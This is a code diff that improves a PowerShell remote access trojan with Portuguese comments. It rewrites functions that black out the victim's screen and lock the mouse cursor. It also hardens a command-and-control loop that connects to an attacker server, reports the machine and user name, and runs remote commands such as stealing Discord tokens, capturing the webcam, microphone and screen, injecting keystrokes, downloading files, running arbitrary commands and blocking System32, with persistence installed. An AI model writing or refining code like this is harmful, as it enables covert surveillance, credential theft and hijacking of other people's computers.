@@ -249,31 +249,19 @@ function Block-System32 {
     }
 }
 
-# ===== TELA PRETA (C# CORRIGIDO) =====
+# ===== TELA PRETA =====
 function Black-Screen {
     try {
-        $code = @'
-using System;
-using System.Windows.Forms;
-public class BlackScreen {
-    public static void Show() {
-        Form f = new Form();
-        f.WindowState = FormWindowState.Maximized;
-        f.FormBorderStyle = FormBorderStyle.None;
-        f.TopMost = true;
-        f.BackColor = System.Drawing.Color.Black;
-        f.ControlBox = false;
-        f.ShowInTaskbar = false;
-        f.KeyPreview = true;
-        f.KeyDown += (s, e) => { if (e.KeyCode == Keys.Escape) f.Close(); };
-        Application.Run(f);
-    }
-}
-'@
-        Add-Type -TypeDefinition $code -ReferencedAssemblies "System.Windows.Forms.dll", "System.Drawing.dll"
-        $thread = New-Object System.Threading.Thread([System.Threading.ThreadStart]{ [BlackScreen]::Show() })
-        $thread.SetApartmentState('STA')
-        $thread.Start()
+        $form = New-Object System.Windows.Forms.Form
+        $form.WindowState = 'Maximized'
+        $form.FormBorderStyle = 'None'
+        $form.TopMost = $true
+        $form.BackColor = 'Black'
+        $form.ControlBox = $false
+        $form.ShowInTaskbar = $false
+        $form.KeyPreview = $true
+        $form.Add_KeyDown({ if ($_.KeyCode -eq 'Escape') { $form.Close() } })
+        $form.ShowDialog()
         return "BLACK_SCREEN"
     } catch {
         return "BLACK_SCREEN_ERROR"
@@ -282,8 +270,10 @@ public class BlackScreen {
 
 function Unlock-Screen {
     try {
-        [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.GetType().Name -eq "Form" -and $_.BackColor -eq [System.Drawing.Color]::Black } | ForEach-Object {
-            $_.Invoke([Action]{ $_.Close() })
+        foreach ($f in [System.Windows.Forms.Application]::OpenForms) {
+            if ($f.BackColor -eq [System.Drawing.Color]::Black -and $f.WindowState -eq 'Maximized') {
+                $f.Invoke([Action]{ $f.Close() })
+            }
         }
         return "SCREEN_UNLOCKED"
     } catch {
@@ -291,7 +281,7 @@ function Unlock-Screen {
     }
 }
 
-# ===== TRAVAR MOUSE (C# CORRIGIDO) =====
+# ===== TRAVAR MOUSE =====
 $global:mouseLocked = $false
 $global:lockThread = $null
 
@@ -301,36 +291,17 @@ function Lock-Mouse {
         
         $global:mouseLocked = $true
         
-        $code = @'
-using System;
-using System.Runtime.InteropServices;
-using System.Windows.Forms;
-public class MouseLocker {
-    [DllImport("user32.dll")]
-    public static extern bool SetCursorPos(int x, int y);
-    
-    [DllImport("user32.dll")]
-    public static extern bool ClipCursor(ref RECT lpRect);
-    
-    [StructLayout(LayoutKind.Sequential)]
-    public struct RECT {
-        public int left, top, right, bottom;
-    }
-    
-    public static void Lock() {
-        RECT rect = new RECT();
-        rect.left = 0; rect.top = 0; rect.right = 1; rect.bottom = 1;
-        ClipCursor(ref rect);
-        while (true) {
-            SetCursorPos(0, 0);
-            System.Threading.Thread.Sleep(5);
-        }
-    }
-}
-'@
-        Add-Type -TypeDefinition $code -ReferencedAssemblies "System.Windows.Forms.dll"
+        $global:lockThread = [System.Threading.Thread]::new({
+            while ($global:mouseLocked) {
+                try {
+                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
+                    Start-Sleep -Milliseconds 1
+                } catch {
+                    # Ignora erros
+                }
+            }
+        })
         
-        $global:lockThread = New-Object System.Threading.Thread([System.Threading.ThreadStart]{ [MouseLocker]::Lock() })
         $global:lockThread.IsBackground = $true
         $global:lockThread.Start()
         
@@ -346,33 +317,6 @@ function Unlock-Mouse {
         if ($global:lockThread -and $global:lockThread.IsAlive) {
             $global:lockThread.Abort()
         }
-        
-        # Libera a área do mouse
-        $code = @'
-using System;
-using System.Runtime.InteropServices;
-using System.Windows.Forms;
-public class MouseUnlocker {
-    [DllImport("user32.dll")]
-    public static extern bool ClipCursor(ref RECT lpRect);
-    
-    [StructLayout(LayoutKind.Sequential)]
-    public struct RECT {
-        public int left, top, right, bottom;
-    }
-    
-    public static void Unlock() {
-        RECT rect = new RECT();
-        rect.left = 0; rect.top = 0;
-        rect.right = Screen.PrimaryScreen.Bounds.Width;
-        rect.bottom = Screen.PrimaryScreen.Bounds.Height;
-        ClipCursor(ref rect);
-    }
-}
-'@
-        Add-Type -TypeDefinition $code -ReferencedAssemblies "System.Windows.Forms.dll"
-        [MouseUnlocker]::Unlock()
-        
         return "MOUSE_UNLOCKED"
     } catch {
         return "UNLOCK_ERROR"
@@ -451,67 +395,82 @@ if (-not (Test-Path "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
     Install-Persistence
 }
 
-# ===== CONEXAO PRINCIPAL =====
+# ===== CONEXAO PRINCIPAL (CORRIGIDA) =====
 while ($true) {
     try {
-        $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
+        $client = New-Object System.Net.Sockets.TcpClient
+        $client.Connect($serverIP, $serverPort)
+        $client.NoDelay = $true
+        $client.ReceiveTimeout = 30000
+        $client.SendTimeout = 30000
+        
         $stream = $client.GetStream()
         $writer = New-Object System.IO.StreamWriter($stream)
         $reader = New-Object System.IO.StreamReader($stream)
         $writer.AutoFlush = $true
         
+        # ENVIA IDENTIFICACAO
         $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
         
         while ($client.Connected) {
-            $cmd = $reader.ReadLine()
-            if ([string]::IsNullOrEmpty($cmd)) { continue }
-            
-            switch ($cmd) {
-                "screenshot" { $writer.WriteLine((Get-ScreenCapture)) }
-                "click" { $writer.WriteLine((Click-Mouse)) }
-                "rightclick" { $writer.WriteLine((RightClick-Mouse)) }
-                "discord" { $writer.WriteLine((Get-DiscordToken)) }
-                "block_system32" { $writer.WriteLine((Block-System32)) }
-                "black_screen" { $writer.WriteLine((Black-Screen)) }
-                "unlock_screen" { $writer.WriteLine((Unlock-Screen)) }
-                "lock_mouse" { $writer.WriteLine((Lock-Mouse)) }
-                "unlock_mouse" { $writer.WriteLine((Unlock-Mouse)) }
-                "mic" { $writer.WriteLine((Get-Microphone)) }
-                "webcam" { $writer.WriteLine((Get-Webcam)) }
-                "processes" { $writer.WriteLine((Get-ProcessList)) }
-                "shutdown" { $writer.WriteLine((Power-Control "shutdown")) }
-                "reboot" { $writer.WriteLine((Power-Control "reboot")) }
-                "list_users" { $writer.WriteLine((Get-RATUsers)) }
-                "remove_current_user" { $writer.WriteLine((Remove-UserFromRAT $currentUser)) }
-                "test" { $writer.WriteLine("PONG") }
-                "exit" { break }
-                default {
-                    if ($cmd -match "^move (.+) (.+)$") {
-                        $writer.WriteLine((Move-Mouse $matches[1] $matches[2]))
-                    } elseif ($cmd -match "^key (.+)$") {
-                        $writer.WriteLine((Send-Key $matches[1]))
-                    } elseif ($cmd -match "^type (.+)$") {
-                        $writer.WriteLine((Send-Text $matches[1]))
-                    } elseif ($cmd -match "^ls (.+)$") {
-                        $writer.WriteLine((Get-FileList $matches[1]))
-                    } elseif ($cmd -match "^download (.+)$") {
-                        $writer.WriteLine((Download-File $matches[1]))
-                    } elseif ($cmd -match "^exec (.+)$") {
-                        $writer.WriteLine((Execute-Command $matches[1]))
-                    } elseif ($cmd -match "^url (.+)$") {
-                        $writer.WriteLine((Open-Url $matches[1]))
-                    } elseif ($cmd -match "^remove_user (.+)$") {
-                        $writer.WriteLine((Remove-UserFromRAT $matches[1]))
-                    } else {
-                        $writer.WriteLine("Comando nao reconhecido")
+            try {
+                $cmd = $reader.ReadLine()
+                if ([string]::IsNullOrEmpty($cmd)) { 
+                    Start-Sleep -Milliseconds 100
+                    continue 
+                }
+                
+                switch ($cmd) {
+                    "screenshot" { $writer.WriteLine((Get-ScreenCapture)) }
+                    "click" { $writer.WriteLine((Click-Mouse)) }
+                    "rightclick" { $writer.WriteLine((RightClick-Mouse)) }
+                    "discord" { $writer.WriteLine((Get-DiscordToken)) }
+                    "block_system32" { $writer.WriteLine((Block-System32)) }
+                    "black_screen" { $writer.WriteLine((Black-Screen)) }
+                    "unlock_screen" { $writer.WriteLine((Unlock-Screen)) }
+                    "lock_mouse" { $writer.WriteLine((Lock-Mouse)) }
+                    "unlock_mouse" { $writer.WriteLine((Unlock-Mouse)) }
+                    "mic" { $writer.WriteLine((Get-Microphone)) }
+                    "webcam" { $writer.WriteLine((Get-Webcam)) }
+                    "processes" { $writer.WriteLine((Get-ProcessList)) }
+                    "shutdown" { $writer.WriteLine((Power-Control "shutdown")) }
+                    "reboot" { $writer.WriteLine((Power-Control "reboot")) }
+                    "list_users" { $writer.WriteLine((Get-RATUsers)) }
+                    "remove_current_user" { $writer.WriteLine((Remove-UserFromRAT $currentUser)) }
+                    "test" { $writer.WriteLine("PONG") }
+                    "exit" { break }
+                    default {
+                        if ($cmd -match "^move (.+) (.+)$") {
+                            $writer.WriteLine((Move-Mouse $matches[1] $matches[2]))
+                        } elseif ($cmd -match "^key (.+)$") {
+                            $writer.WriteLine((Send-Key $matches[1]))
+                        } elseif ($cmd -match "^type (.+)$") {
+                            $writer.WriteLine((Send-Text $matches[1]))
+                        } elseif ($cmd -match "^ls (.+)$") {
+                            $writer.WriteLine((Get-FileList $matches[1]))
+                        } elseif ($cmd -match "^download (.+)$") {
+                            $writer.WriteLine((Download-File $matches[1]))
+                        } elseif ($cmd -match "^exec (.+)$") {
+                            $writer.WriteLine((Execute-Command $matches[1]))
+                        } elseif ($cmd -match "^url (.+)$") {
+                            $writer.WriteLine((Open-Url $matches[1]))
+                        } elseif ($cmd -match "^remove_user (.+)$") {
+                            $writer.WriteLine((Remove-UserFromRAT $matches[1]))
+                        } else {
+                            $writer.WriteLine("Comando nao reconhecido")
+                        }
                     }
                 }
+            } catch {
+                # Se der erro na leitura/escrita, sai do loop interno
+                break
             }
         }
     } catch {
-        Start-Sleep -Seconds 10
+        # Silenciosamente ignora erros de conexão
     } finally {
         if ($client) { $client.Close() }
+        Start-Sleep -Seconds 5
     }
 }
 
